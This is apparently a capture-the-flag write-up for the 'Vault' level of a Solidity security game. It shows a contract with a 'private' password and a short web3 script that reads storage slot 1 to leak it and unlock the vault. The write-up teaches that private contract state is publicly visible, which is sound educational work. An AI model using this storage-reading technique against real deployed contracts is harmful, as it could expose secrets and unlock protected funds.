# Vault

> Unlock the vault to pass the level!

```solidity
pragma solidity ^0.4.18;

contract Vault {
  bool public locked;
  bytes32 private password;

  function Vault(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

It seems we need to leak the password. From the docs, we know that:

> Everything that is inside a contract is visible to all external observers. Making something private only prevents other contracts from accessing and modifying the information, but it will still be visible to the whole world outside of the blockchain.

We get our Vault instance and try to get the password directly from our instance's storage.

```javascript
function getStorageAt (address, idx) {
  return new Promise (function (resolve, reject) {
    web3.eth.getStorageAt(address, idx, function (error, result) {
      if (error) {
        reject(error);
      } else {
        resolve(result);
      }
    })
})}

await getStorageAt(instance, 1); // 1 since "password" is the 2nd variable in storage. The 1st is "locked".
```

Now submit the secret with `contract.unlock("SECRET");` and the vault will be unlocked. Check with `await contract.locked()`.

MetaMask not accepting synchronous calls is a real pain for this game, but it's necessary overall. :/
